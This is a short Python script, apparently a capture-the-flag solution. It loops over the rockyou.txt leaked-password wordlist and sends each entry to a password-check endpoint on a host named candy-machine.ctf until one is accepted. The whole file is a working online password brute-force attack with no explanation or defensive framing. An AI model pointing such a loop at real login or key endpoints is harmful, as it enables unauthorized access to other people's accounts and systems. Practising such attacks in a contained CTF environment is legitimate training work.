import requests
import urllib

data = open('/home/charles/Downloads/rockyou.txt', 'r', encoding='latin-1').readlines()

for line in data:
	line = line.replace('\n','')
	res = requests.get(f'http://candy-machine.ctf:8090/candy-machine-get-key', params={'password': line})
	if res.text == "Bad password\n" or res.text == "Missing password\n":
		print(line, "Does not work...")
		continue
	
	print(line, "WORKS!")
	break